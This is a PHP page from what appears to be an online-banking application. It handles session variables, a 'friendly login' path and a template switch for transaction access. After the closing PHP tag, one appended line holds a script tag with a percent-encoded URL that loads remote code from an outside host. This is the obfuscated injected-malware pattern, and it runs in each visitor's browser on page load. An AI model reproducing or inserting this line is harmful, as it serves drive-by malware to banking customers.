
<?php
include("eztransaccion/user/include/controles_javascript.inc");
include("eztransaccion/user/include/tcpipnexions.php");
include("eztransaccion/user/include/xmlparser.inc");
include_once("eztransaccion/user/include/general_functions.inc");
include_once( "eztransaccion/classes/encrypt.php" );

/*
include_once( "classes/INIFile.php" );
$GLOBALS[ "GlobalSiteIni" ] = INIFile::globalINI();
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );
*/

session_start();

$Access = $_POST['Access'];
if(empty($Access) )
{
	// if ($dclrequerido == 1)
	// {
		// $Access = "FrAc";
	// }
	// else
	// {
		// $Access = "FrAcMenu";
	// }

	$Access = "FrAc";
	
}

//	$session->setVariable( "r_tkchk", "False" );	// JAC MAR2012 AUDITORIA //ACS 25Jun2012 Modificación para conservar sesión en recurrencia

	// JFL [8-Ene-2012] T-233421 (ini) > Login Amigable Bajionet
	$session =& eZSession::globalSession();
	$usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
    $particularFields = "";
    
	$friendly_login = $session->variable( "isFriendlyLogin" );
	$friendly_login = empty($friendly_login) ? "False" : $friendly_login;
	$fingerprint = $session->variable( "finPrint" );
	
	if($friendly_login == "True"){
    	
    	$tipo_token = $session->variable( "r_typetk" );
    	$serialKey = $session->variable( "tk_SerialKey" );
    	$userStep = $session->variable( "userStep" );
    	
    	include("middleware/login/controller/login_main_controller.php");
    	
    } else {
    	
     	$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
	                         "eztransaccion/user/intl/", $Language, "clienteasb.php" );
	    $t->setAllStrings();
	    $t->set_file( array( "clienteasb_tpl" => "clienteasb.tpl" ) );
		
	    switch($Access) {
	    case "FrAc":
	    	include("eztransaccion/user/include/clienteasb_ajax.inc");
	        break;
		// JAC MAR2012 AUDITORIA INI
		case "Confirm":
		case "Process":
			$session->setVariable( "r_tkchk", "True" );
			include("eztransaccion/user/include/clienteasb_ajax.inc");
			break;
		// JAC MAR2012 AUDITORIA FIN
	    
	    }
    }
    // JFL [8-Ene-2012] T-233421 (fin) > Login Amigable Bajionet
	
?>
<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>